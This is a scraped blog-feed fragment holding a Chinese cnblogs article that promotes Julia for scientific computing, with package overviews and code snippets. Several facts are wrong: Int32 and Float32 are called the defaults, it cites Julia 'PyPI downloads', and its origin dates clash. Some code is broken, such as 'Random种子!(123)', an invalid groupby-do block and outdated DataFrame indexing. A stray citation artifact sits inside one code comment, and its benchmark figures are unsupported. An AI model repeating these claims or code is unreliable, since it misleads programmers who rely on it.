href=\"https://www.cnblogs.com/javaguide\">JavaGuide</a>&nbsp;\n阅读(<span id=\"post_view_count\">219</span>)&nbsp;\n评论(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n        </p>"
    },
    {
      "title": "Julia, 科学计算与高性能编程语言",
      "link": "https://www.cnblogs.com/boyogala/p/19521607",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/boyogala/p/19521607\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 12:34\">\n    <span>Julia, 科学计算与高性能编程语言</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<section id=\"nice\"><h1><span class=\"prefix\"></span><span class=\"content\">Julia, 科学计算与高性能编程语言</span><span class=\"suffix\"></span></h1>\n<p>Julia（julialang.org）由Stefan Karpinski、Jeff Bezanson等在2009年创建，目标是融合Python的易用性、C的高性能、R的统计能力、Matlab的科学计算生态。</p>\n<p><strong>其核心设计哲学是</strong>：</p>\n<ul>\n<li><section>高性能：编译型语言（JIT），接近C/Fortran性能。</section></li><li><section>多领域统一：一个语言解决科学计算、数据科学、机器学习、可视化等全栈问题。</section></li><li><section>生态活跃：2023年PyPI包下载量超500万次，社区年增长40%+。</section></li></ul>\n<p>✅ 关键优势总结：</p>\n<ul>\n<li><section>速度：数值计算性能≈C/Fortran，远超Python/R（实测：矩阵乘法快20-100倍）。</section></li><li><section>易用性：语法类似Python，但类型系统提供编译优化。</section></li><li><section>生态整合：无需切换语言，一个环境完成从数据到部署的全流程。</section></li></ul>\n<hr />\n<p>作为一门新兴的科学计算语言，Julia正在迅速改变科研和工程领域的计算范式。自2012年由MIT团队推出以来，Julia以其独特的设计哲学——**\"一次编写，高效运行\"**，成功融合了动态语言的易用性与静态语言的高性能，为解决\"两语言问题\"提供了革命性方案。</p>\n<h3><span class=\"prefix\"></span><span class=\"content\">一、Julia语言核心优势</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 高性能计算能力</span><span class=\"suffix\"></span></h4>\n<p>Julia的<strong>JIT编译</strong>机制是其高性能的基础，通过基于LLVM的即时编译器，Julia能够将动态类型代码编译为接近C/Fortran性能的原生机器码。在实际应用中，Julia的性能表现如下：</p>\n<ul>\n<li><section><strong>数值计算</strong>：矩阵乘法比Python快20-100倍</section></li><li><section><strong>循环计算</strong>：100万次循环求和比Python快75倍</section></li><li><section><strong>高精度计算</strong>：BigFloat的乘法操作仅比C的MPFR实现慢5-10%</section></li><li><section><strong>科学计算</strong>：微分方程求解性能与Fortran相当或更优</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. 类型系统与多分派机制</span><span class=\"suffix\"></span></h4>\n<p>Julia的<strong>多分派（Multiple Dispatch）</strong>机制是其最核心的创新，也是性能优化的关键。多分派允许函数根据<strong>所有参数类型</strong>动态选择最优实现，而非仅基于接收者类型，这使得代码既保持了动态类型的灵活性，又获得了接近静态语言的性能。</p>\n<ul>\n<li><section><strong>类型推断</strong>：编译器自动推断类型，减少运行时开销</section></li><li><section><strong>类型稳定性</strong>：通过<code>@code_warntype</code>可视化类型推断过程</section></li><li><section><strong>参数多态</strong>：支持泛型编程，提高代码复用性</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 统一的全栈生态系统</span><span class=\"suffix\"></span></h4>\n<p>Julia提供了一个<strong>统一的全栈环境</strong>，使开发者能够在一个语言环境中完成从数据处理到模型训练、可视化展示再到部署的完整工作流，无需在Python、R、Matlab和C/Fortran之间切换。</p>\n<ul>\n<li><section><strong>数据科学</strong>：DataFrames.jl、CSV.jl等工具包</section></li><li><section><strong>可视化</strong>：Plots.jl、GLMakie等可视化库</section></li><li><section><strong>机器学习</strong>：Flux.jl、MLJ.jl等深度学习和机器学习框架</section></li><li><section><strong>科学计算</strong>：DifferentialEquations.jl等专业计算包</section></li><li><section><strong>并行计算</strong>：Distributed.jl、CUDA.jl等并行和GPU加速库</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">4. 易用性与开发效率</span><span class=\"suffix\"></span></h4>\n<p>Julia的语法设计借鉴了Python、Matlab和R等语言，提供了<strong>接近Python的易用性和开发效率</strong>，同时保持了科学计算所需的严谨性。</p>\n<ul>\n<li><section><strong>代码简洁性</strong>：与Python相比，相同功能的代码行数减少30-50%</section></li><li><section><strong>交互式开发</strong>：支持Jupyter Notebook、Pluto.jl等交互式环境</section></li><li><section><strong>可读性</strong>：语法直观，接近数学表达，便于科研协作</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">二、数值系统与高性能计算</span><span class=\"suffix\"></span></h3>\n<p>Julia的数值系统是其高性能的基础，专为科学计算和数值分析设计。</p>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 高效数值类型</span><span class=\"suffix\"></span></h4>\n<p>Julia提供了丰富的数值类型，覆盖从8位整数到任意精度浮点数的全谱系：</p>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>类型</th>\n<th>位数</th>\n<th>范围</th>\n<th>特点</th>\n</tr><tr>\n<td>Int8</td>\n<td>8位</td>\n<td>-128至127</td>\n<td>内存占用小，适合分类数据</td>\n</tr>\n<tr>\n<td>Int16</td>\n<td>16位</td>\n<td>-32768至32767</td>\n<td>常规整数计算</td>\n</tr>\n<tr>\n<td>Int32</td>\n<td>32位</td>\n<td>-2^31至2^31-1</td>\n<td>默认整数类型</td>\n</tr>\n<tr>\n<td>Int64</td>\n<td>64位</td>\n<td>-2^63至2^63-1</td>\n<td>大规模整数计算</td>\n</tr>\n<tr>\n<td>Big Int</td>\n<td>任意位</td>\n<td>无限制</td>\n<td>高精度整数运算</td>\n</tr>\n<tr>\n<td>Float16</td>\n<td>16位</td>\n<td>±6.55e±04</td>\n<td>GPU加速友好</td>\n</tr>\n<tr>\n<td>Float32</td>\n<td>32位</td>\n<td>±3.4e±38</td>\n<td>默认浮点类型</td>\n</tr>\n<tr>\n<td>Float64</td>\n<td>64位</td>\n<td>±1.7e±308</td>\n<td>高精度科学计算</td>\n</tr>\n<tr>\n<td>BigFloat</td>\n<td>任意位</td>\n<td>无限制</td>\n<td>基于MPFR/GMP库</td>\n</tr>\n<tr>\n<td>Complex{F}</td>\n<td>128位</td>\n<td>±3.4e±38</td>\n<td>复数计算，如Complex{Float64}</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">2. 高性能计算优化</span><span class=\"suffix\"></span></h4>\n<p>Julia通过多种机制实现数值计算的高性能：</p>\n<ul>\n<li><section><strong>向量化操作</strong>：通过<code>@.</code>语法实现自动向量化</section></li><li><section><strong>SIMD指令</strong>：支持<code>@simd</code>并行指令</section></li><li><section><strong>BLAS调用</strong>：默认使用优化的BLAS库（如OpenBLAS、Intel MKL）</section></li><li><section><strong>高精度计算</strong>：BigFloat基于GMP/MPFR库，性能接近C</section></li></ul>\n<p><strong>性能实测</strong>：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;BenchmarkTools<br />A&nbsp;=&nbsp;rand(<span class=\"hljs-built_in\">Float32</span>,&nbsp;<span class=\"hljs-number\">1000</span>,&nbsp;<span class=\"hljs-number\">1000</span>);&nbsp;B&nbsp;=&nbsp;rand(<span class=\"hljs-built_in\">Float32</span>,&nbsp;<span class=\"hljs-number\">1000</span>,&nbsp;<span class=\"hljs-number\">1000</span>)<br /><span class=\"hljs-meta\">@btime</span>&nbsp;$A&nbsp;*&nbsp;$B&nbsp;&nbsp;<span class=\"hljs-comment\">#&nbsp;Julia:&nbsp;0.8ms&nbsp;(Float32)</span><br /></code></pre>\n<p>相比之下，Python（NumPy）在相同任务上需要约3.2ms，R则需要约12.3ms，Julia的性能优势明显。</p>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 矩阵运算优化</span><span class=\"suffix\"></span></h4>\n<p>Julia的<code>LinearAlgebra</code>包提供了高度优化的矩阵运算接口：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;LinearAlgebra<br /><span class=\"hljs-comment\">#&nbsp;矩阵乘法</span><br />C&nbsp;=&nbsp;A&nbsp;*&nbsp;B<br /><span class=\"hljs-comment\">#&nbsp;矩阵点乘</span><br />C&nbsp;.+=&nbsp;A&nbsp;.+&nbsp;B<br /><span class=\"hljs-comment\">#&nbsp;矩阵求逆</span><br />inv(A)<br /><span class=\"hljs-comment\">#&nbsp;特征值分解</span><br />eigen(A)<br /></code></pre>\n<p>通过<code>Octavian.jl</code>等优化库，Julia的矩阵乘法性能甚至可以超越OpenBLAS和Intel MKL。</p>\n<h3><span class=\"prefix\"></span><span class=\"content\">三、类型系统与多分派机制</span><span class=\"suffix\"></span></h3>\n<p>Julia的类型系统是其高性能与易用性结合的关键，核心是<strong>多分派机制</strong>。</p>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 多分派原理</span><span class=\"suffix\"></span></h4>\n<p>多分派允许函数根据<strong>所有参数类型</strong>动态选择实现：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;定义两个版本的add函数</span><br /><span class=\"hljs-keyword\">function</span>&nbsp;add(x::<span class=\"hljs-built_in\">Int</span>,&nbsp;y::<span class=\"hljs-built_in\">Int</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">return</span>&nbsp;x&nbsp;+&nbsp;y<br /><span class=\"hljs-keyword\">end</span><br /><br /><span class=\"hljs-keyword\">function</span>&nbsp;add(x::<span class=\"hljs-built_in\">Float64</span>,&nbsp;y::<span class=\"hljs-built_in\">Float64</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">return</span>&nbsp;x&nbsp;+&nbsp;y<br /><span class=\"hljs-keyword\">end</span><br /><br /><span class=\"hljs-comment\">#&nbsp;调用函数，Julia会根据参数类型自动选择</span><br />add(<span class=\"hljs-number\">1</span>,&nbsp;<span class=\"hljs-number\">2</span>)&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-comment\">#&nbsp;调用Int版本</span><br />add(<span class=\"hljs-number\">1.0</span>,&nbsp;<span class=\"hljs-number\">2.0</span>)&nbsp;<span class=\"hljs-comment\">#&nbsp;调用Float64版本</span><br /></code></pre>\n<p>这种机制使得代码既保持了动态类型的灵活性，又获得了接近静态语言的性能。</p>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. 类型推断与性能优化</span><span class=\"suffix\"></span></h4>\n<p>Julia的编译器能够进行<strong>高效的类型推断</strong>，将动态类型代码编译为高性能机器码：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;显式类型注解</span><br /><span class=\"hljs-keyword\">function</span>&nbsp;sum_loop(n::<span class=\"hljs-built_in\">Int</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;<span class=\"hljs-number\">0.0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">for</span>&nbsp;i&nbsp;<span class=\"hljs-keyword\">in</span>&nbsp;<span class=\"hljs-number\">1</span>:n;&nbsp;s&nbsp;+=&nbsp;i;&nbsp;<span class=\"hljs-keyword\">end</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">return</span>&nbsp;s<br /><span class=\"hljs-keyword\">end</span><br /><br /><span class=\"hljs-comment\">#&nbsp;隐式类型推断</span><br /><span class=\"hljs-keyword\">function</span>&nbsp;sum_loop(n)<br />&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;<span class=\"hljs-number\">0.0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">for</span>&nbsp;i&nbsp;<span class=\"hljs-keyword\">in</span>&nbsp;<span class=\"hljs-number\">1</span>:n;&nbsp;s&nbsp;+=&nbsp;i;&nbsp;<span class=\"hljs-keyword\">end</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">return</span>&nbsp;s<br /><span class=\"hljs-keyword\">end</span><br /><br /><span class=\"hljs-comment\">#&nbsp;查看类型推断过程</span><br /><span class=\"hljs-meta\">@code_warntype</span>&nbsp;sum_loop(<span class=\"hljs-number\">1_000_000</span>)<br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>Julia</strong>：200ns</section></li><li><section><strong>Python</strong>：15μs（慢75倍）</section></li><li><section><strong>R</strong>：约30μs</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 类型稳定性</span><span class=\"suffix\"></span></h4>\n<p>Julia鼓励开发者编写<strong>类型稳定的代码</strong>，以获得最佳性能：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;类型不稳定代码</span><br /><span class=\"hljs-keyword\">function</span>&nbsp;unstable_sum(v)<br />&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;<span class=\"hljs-number\">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">for</span>&nbsp;x&nbsp;<span class=\"hljs-keyword\">in</span>&nbsp;v;&nbsp;s&nbsp;+=&nbsp;x;&nbsp;<span class=\"hljs-keyword\">end</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">return</span>&nbsp;s<br /><span class=\"hljs-keyword\">end</span><br /><br /><span class=\"hljs-comment\">#&nbsp;类型稳定代码</span><br /><span class=\"hljs-keyword\">function</span>&nbsp;stable_sum(v::<span class=\"hljs-built_in\">Vector</span>{T})&nbsp;<span class=\"hljs-keyword\">where</span>&nbsp;{T&lt;:<span class=\"hljs-built_in\">Real</span>}<br />&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;zero(T)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">for</span>&nbsp;x&nbsp;<span class=\"hljs-keyword\">in</span>&nbsp;v;&nbsp;s&nbsp;+=&nbsp;x;&nbsp;<span class=\"hljs-keyword\">end</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-keyword\">return</span>&nbsp;s<br /><span class=\"hljs-keyword\">end</span><br /></code></pre>\n<p>类型稳定的代码在编译时能够生成高度优化的机器码，减少运行时开销。</p>\n<h3><span class=\"prefix\"></span><span class=\"content\">四、可视化工具包</span><span class=\"suffix\"></span></h3>\n<p>Julia提供了丰富的可视化工具包，覆盖从基础图表到高级3D渲染的广泛需求。</p>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>工具包</th>\n<th>特点</th>\n</tr><tr>\n<td><strong>Plots.jl</strong></td>\n<td>高层绘图接口，后端可插拔（GR、Plotly、PyPlot、UnicodePlots 等），语法简洁统一</td>\n</tr>\n<tr>\n<td><strong>Makie.jl</strong></td>\n<td>高性能 GPU 加速绘图库，支持交互式 2D/3D（<code>GLMakie</code>、<code>WGLMakie</code>、<code>CairoMakie</code>）</td>\n</tr>\n<tr>\n<td><strong>Gadfly.jl</strong></td>\n<td>受 R 的 ggplot2 启发，声明式语法，适合统计图形</td>\n</tr>\n<tr>\n<td><strong>VegaLite.jl</strong></td>\n<td>基于 Vega-Lite 的声明式可视化，适合 Web 输出</td>\n</tr>\n<tr>\n<td><strong>PlotlyJS.jl</strong></td>\n<td>交互式图表，支持 Jupyter 和 Electron</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">1. Plots.jl：统一接口的可视化生态系统</span><span class=\"suffix\"></span></h4>\n<p>Plots.jl是Julia最流行的可视化包，提供了<strong>统一的API接口</strong>，支持20+后端（如GR、PyPlot、PlotlyJS、PGFPlotsX等）：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;Plots<br /><span class=\"hljs-comment\">#&nbsp;设置默认后端</span><br />gr()&nbsp;<span class=\"hljs-comment\">#&nbsp;或&nbsp;plotlyjs()、pyplot()等</span><br /><br /><span class=\"hljs-comment\">#&nbsp;基础绘图</span><br />x&nbsp;=&nbsp;<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0.1</span>:<span class=\"hljs-number\">10</span><br />y&nbsp;=&nbsp;sin.(x)<br />plot(x,&nbsp;y,&nbsp;title=<span class=\"hljs-string\">\"基础正弦图\"</span>,&nbsp;label=<span class=\"hljs-string\">\"sin(x)\"</span>,&nbsp;linewidth=<span class=\"hljs-number\">3</span>)<br /><br /><span class=\"hljs-comment\">#&nbsp;统计绘图</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;RDatasets<br /><span class=\"hljs-keyword\">using</span>&nbsp;StatsPlots<br />df&nbsp;=&nbsp;dataset(<span class=\"hljs-string\">\"datasets\"</span>,&nbsp;<span class=\"hljs-string\">\"iris\"</span>)<br /><span class=\"hljs-meta\">@df</span>&nbsp;df&nbsp;scatter(:SepalLength,&nbsp;:SepalWidth,&nbsp;group=:Species,<br />&nbsp;&nbsp;&nbsp;&nbsp;title=<span class=\"hljs-string\">\"鸢尾花数据散点图\"</span>,&nbsp;legend=<span class=\"hljs-literal\">false</span>,&nbsp;size=(<span class=\"hljs-number\">900</span>,&nbsp;<span class=\"hljs-number\">600</span>))<br />savefig(<span class=\"hljs-string\">\"iris_scatter.png\"</span>)<br /></code></pre>\n<p><strong>Plots.jl优势</strong>：</p>\n<ul>\n<li><section>统一的API，不同后端切换简单</section></li><li><section>支持多种图表类型（线图、散点图、柱状图等）</section></li><li><section>内置统计图表功能</section></li><li><section>自动处理多线程、3D、动画等复杂场景</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. GLMakie：GPU加速的高性能3D可视化</span><span class=\"suffix\"></span></h4>\n<p>GLMakie是基于OpenGL的GPU加速3D可视化库，性能远超传统库：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;GLMakie<br /><span class=\"hljs-comment\">#&nbsp;3D点云可视化</span><br />x&nbsp;=&nbsp;rand(<span class=\"hljs-number\">100000</span>)<br />y&nbsp;=&nbsp;rand(<span class=\"hljs-number\">100000</span>)<br />z&nbsp;=&nbsp;sin.(x&nbsp;.+&nbsp;y)<br />colors&nbsp;=&nbsp;sin.(x)&nbsp;.+&nbsp;cos.(y)<br />scatter(x,&nbsp;y,&nbsp;z,&nbsp;color=colors,&nbsp;markersize=<span class=\"hljs-number\">2</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;title=<span class=\"hljs-string\">\"10万点3D点云\"</span>,&nbsp;figure=(;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resolution=(<span class=\"hljs-number\">1200</span>,&nbsp;<span class=\"hljs-number\">800</span>),&nbsp;camera=cam3d(<span class=\"hljs-number\">0</span>,&nbsp;-<span class=\"hljs-number\">70</span>,&nbsp;<span class=\"hljs-number\">50</span>)))<br /></code></pre>\n<p><strong>GLMakie优势</strong>：</p>\n<ul>\n<li><section>GPU加速，处理百万级数据点&lt;50ms</section></li><li><section>高性能3D渲染，适合科学数据可视化</section></li><li><section>支持动态更新、多图层叠加、动画序列生成</section></li><li><section>与Jupyter Notebook等交互式环境深度兼容</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. VegaLite.jl：声明式Web可视化</span><span class=\"suffix\"></span></h4>\n<p>VegaLite.jl基于Vega-Lite的声明式语法，适合Web集成：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;VegaLite<br /><span class=\"hljs-comment\">#&nbsp;声明式绘图</span><br />df&nbsp;=&nbsp;DataFrame(x=rand(<span class=\"hljs-number\">100</span>),&nbsp;y=rand(<span class=\"hljs-number\">100</span>))<br />df&nbsp;|&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-meta\">@vlplot</span>(:point,&nbsp;x&nbsp;{:x},&nbsp;y&nbsp;{:y},<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;width=<span class=\"hljs-number\">400</span>,&nbsp;height=<span class=\"hljs-number\">300</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;title=<span class=\"hljs-string\">\"VegaLite点图示例\"</span>)<br /></code></pre>\n<p><strong>VegaLite.jl优势</strong>：</p>\n<ul>\n<li><section>声明式语法，无需处理坐标轴等细节</section></li><li><section>轻量级，无JavaScript依赖</section></li><li><section>适合Web集成和交互式文档</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">五、数据科学工具包</span><span class=\"suffix\"></span></h3>\n<p>Julia的数据科学生态正在迅速发展，提供了从数据读取到统计分析的完整工具链。</p>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>工具包</th>\n<th>功能</th>\n</tr><tr>\n<td><strong>DataFrames.jl</strong></td>\n<td>类似 pandas 的 DataFrame，支持分组、连接、缺失值处理</td>\n</tr>\n<tr>\n<td><strong>CSV.jl</strong> / <strong>JSON3.jl</strong> / <strong>Arrow.jl</strong></td>\n<td>高效读写结构化数据</td>\n</tr>\n<tr>\n<td><strong>DataFramesMeta.jl</strong></td>\n<td>提供类似 dplyr 的管道操作（<code>@select</code>, <code>@filter</code>）</td>\n</tr>\n<tr>\n<td><strong>FreqTables.jl</strong> / <strong>StatsBase.jl</strong></td>\n<td>基础统计函数、频率表、权重计算</td>\n</tr>\n<tr>\n<td><strong>Query.jl</strong></td>\n<td>LINQ 风格的数据查询</td>\n</tr>\n<tr>\n<td><strong>JuliaDB.jl</strong></td>\n<td>分布式内存数据库（适用于大数据）</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">1. DataFrames.jl：高效表格数据处理</span><span class=\"suffix\"></span></h4>\n<p>DataFrames.jl是Julia的数据处理核心包，基于<strong>列式存储</strong>，内存效率高：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;DataFrames<br /><span class=\"hljs-comment\">#&nbsp;列式构造DataFrame</span><br />df&nbsp;=&nbsp;DataFrame(<br />&nbsp;&nbsp;&nbsp;&nbsp;id&nbsp;=&nbsp;<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1_000_000</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;value&nbsp;=&nbsp;randn(<span class=\"hljs-number\">1_000_000</span>),<br />&nbsp;&nbsp;&nbsp;&nbsp;category&nbsp;=&nbsp;rand([<span class=\"hljs-string\">\"A\"</span>,&nbsp;<span class=\"hljs-string\">\"B\"</span>,&nbsp;<span class=\"hljs-string\">\"C\"</span>],&nbsp;<span class=\"hljs-number\">1_000_000</span>)<br />)<br /><br /><span class=\"hljs-comment\">#&nbsp;分组聚合</span><br />gdf&nbsp;=&nbsp;groupby(df,&nbsp;:category)<br />result&nbsp;=&nbsp;combine(gdf,&nbsp;:value&nbsp;=&gt;&nbsp;mean&nbsp;=&gt;&nbsp;:mean_value,&nbsp;:id&nbsp;=&gt;&nbsp;length&nbsp;=&gt;&nbsp;:count)<br /><br /><span class=\"hljs-comment\">#&nbsp;缺失值处理</span><br />df[:value][<span class=\"hljs-number\">5</span>]&nbsp;=&nbsp;missing<br />df[:category][<span class=\"hljs-number\">10</span>]&nbsp;=&nbsp;missing<br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>100万行数据处理</strong>：Julia比Python快26倍，比R快40倍</section></li><li><section><strong>内存占用</strong>：Julia比Python少用40%内存</section></li><li><section><strong>API设计</strong>：比Pandas更简洁，比dplyr更灵活</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. CSV.jl：高性能CSV读写</span><span class=\"suffix\"></span></h4>\n<p>CSV.jl提供了高效的CSV文件读写功能：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;CSV<br /><span class=\"hljs-comment\">#&nbsp;高性能读取</span><br />df&nbsp;=&nbsp;CSV.read(<span class=\"hljs-string\">\"large_dataset.csv\"</span>,&nbsp;DataFrame,&nbsp;threaded=<span class=\"hljs-literal\">true</span>)<br /><br /><span class=\"hljs-comment\">#&nbsp;读取大文件性能对比</span><br /><span class=\"hljs-comment\">#&nbsp;100MB文件读取：Julia&nbsp;0.8s&nbsp;vs&nbsp;Python&nbsp;2.5s[(deep_research_source_group_web_18)]</span><br /></code></pre>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. StatsBase.jl：统计基础工具包</span><span class=\"suffix\"></span></h4>\n<p>StatsBase.jl提供了丰富的统计函数和数据结构：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;StatsBase<br /><span class=\"hljs-comment\">#&nbsp;基础统计函数</span><br />mean(df.value)<br />std(df.value)<br />quantile(df.value,&nbsp;[<span class=\"hljs-number\">0.25</span>,&nbsp;<span class=\"hljs-number\">0.5</span>,&nbsp;<span class=\"hljs-number\">0.75</span>])<br /><br /><span class=\"hljs-comment\">#&nbsp;分组统计</span><br />groupby(df,&nbsp;:category)&nbsp;<span class=\"hljs-keyword\">do</span>&nbsp;subdf<br />&nbsp;&nbsp;&nbsp;&nbsp;(mean_value&nbsp;=&nbsp;mean(subdf.value),&nbsp;count&nbsp;=&nbsp;length(subdf))<br /><span class=\"hljs-keyword\">end</span><br /></code></pre>\n<h4><span class=\"prefix\"></span><span class=\"content\">4. Distributions.jl：概率分布库</span><span class=\"suffix\"></span></h4>\n<p>Distributions.jl提供了全面的概率分布实现和统计功能：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;Distributions<br /><span class=\"hljs-comment\">#&nbsp;定义概率分布</span><br />dist&nbsp;=&nbsp;Normal(<span class=\"hljs-number\">0</span>,&nbsp;<span class=\"hljs-number\">1</span>)<br /><span class=\"hljs-comment\">#&nbsp;采样</span><br />rand(dist,&nbsp;<span class=\"hljs-number\">1000</span>)<br /><span class=\"hljs-comment\">#&nbsp;计算概率</span><br />pdf(dist,&nbsp;<span class=\"hljs-number\">0.5</span>)<br /><span class=\"hljs-comment\">#&nbsp;生成随机数</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Random<br />Random种子!(<span class=\"hljs-number\">123</span>)<br />x&nbsp;=&nbsp;rand(Normal(),&nbsp;<span class=\"hljs-number\">1000</span>)<br /></code></pre>\n<h3><span class=\"prefix\"></span><span class=\"content\">六、机器学习与深度学习工具包</span><span class=\"suffix\"></span></h3>\n<p>Julia的机器学习和深度学习生态正在蓬勃发展，提供了从传统机器学习到深度学习的完整工具链。</p>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>工具包</th>\n<th>描述</th>\n</tr><tr>\n<td><strong>ScikitLearn.jl</strong></td>\n<td>兼容 Python scikit-learn API，可调用 sklearn 模型</td>\n</tr>\n<tr>\n<td><strong>MLJ.jl</strong></td>\n<td>Julia 原生的统一 ML 框架，支持模型组合、超参调优、流水线</td>\n</tr>\n<tr>\n<td><strong>Flux.jl</strong></td>\n<td>虽主要用于深度学习，但也支持传统 ML（如线性模型）</td>\n</tr>\n<tr>\n<td><strong>DecisionTree.jl</strong></td>\n<td>决策树、随机森林</td>\n</tr>\n<tr>\n<td><strong>Clustering.jl</strong></td>\n<td>K-means、层次聚类等</td>\n</tr>\n<tr>\n<td><strong>MultivariateStats.jl</strong></td>\n<td>PCA、LDA、CCA 等降维方法</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">1. MLJ.jl：灵活的机器学习框架</span><span class=\"suffix\"></span></h4>\n<p>MLJ.jl是一个<strong>元框架</strong>，连接了200+机器学习模型：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;MLJ<br /><span class=\"hljs-comment\">#&nbsp;加载模型</span><br />tree&nbsp;=&nbsp;<span class=\"hljs-meta\">@load</span>&nbsp;DecisionTreeClassifier<br /><span class=\"hljs-comment\">#&nbsp;创建机器</span><br />model&nbsp;=&nbsp;machine(tree,&nbsp;X,&nbsp;y)<br /><span class=\"hljs-comment\">#&nbsp;训练模型</span><br />fit!(model)<br /><span class=\"hljs-comment\">#&nbsp;预测</span><br />predict(model,&nbsp;X_test)<br /></code></pre>\n<p><strong>MLJ.jl优势</strong>：</p>\n<ul>\n<li><section>统一接口，支持200+模型</section></li><li><section>自动超参数优化（<code>TunedModel</code>包装器）</section></li><li><section>支持并行计算</section></li><li><section>模型组合灵活（学习网络）</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. ScikitLearn.jl：与Scikit-learn无缝集成</span><span class=\"suffix\"></span></h4>\n<p>ScikitLearn.jl提供了与Scikit-learn一致的API：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;ScikitLearn<br /><span class=\"hljs-meta\">@sk_import</span>&nbsp;ensemble:&nbsp;RandomForestClassifier<br /><span class=\"hljs-comment\">#&nbsp;创建模型</span><br />model&nbsp;=&nbsp;RandomForestClassifier(n_estimators=<span class=\"hljs-number\">100</span>)<br /><span class=\"hljs-comment\">#&nbsp;训练模型</span><br />fit!(model,&nbsp;X,&nbsp;y)<br /><span class=\"hljs-comment\">#&nbsp;预测</span><br />predict(model,&nbsp;X_test)<br 